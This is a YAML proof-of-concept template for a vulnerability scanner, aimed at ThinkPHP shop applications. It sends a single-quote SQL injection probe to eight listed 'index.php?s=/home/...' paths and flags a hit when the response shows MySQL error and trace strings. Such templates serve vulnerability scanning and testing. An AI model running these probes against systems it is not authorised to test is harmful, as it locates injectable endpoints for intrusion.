id: poc-yaml-thinkphp-multi-sql-injection
info:
  name: ThinkPHP 多处 SQL 注入漏洞
  severity: high
  tags:
  - sql-injection
  - 两高一弱
  finger: ThinkPHP
  osprey-id: vb_2019_0068
variables:
  v_path: '/index.php?s=/home/shopcart/getPricetotal/tag/1%27

    /index.php?s=/home/shopcart/getpriceNum/id/1%27

    /index.php?s=/home/user/cut/id/1%27

    /index.php?s=/home/service/index/id/1%27

    /index.php?s=/home/pay/chongzhi/orderid/1%27

    /index.php?s=/home/order/complete/id/1%27

    /index.php?s=/home/order/detail/id/1%27

    /index.php?s=/home/order/cancel/id/1%27'
requests:
- method: GET
  path: '{{.v_path}}'
  expression: 'contains(body, "SQL syntax") && contains(body, "Driver.class.php")
    && contains(body, "FILE:") && contains(body, "TRACE")

    '
transport: http
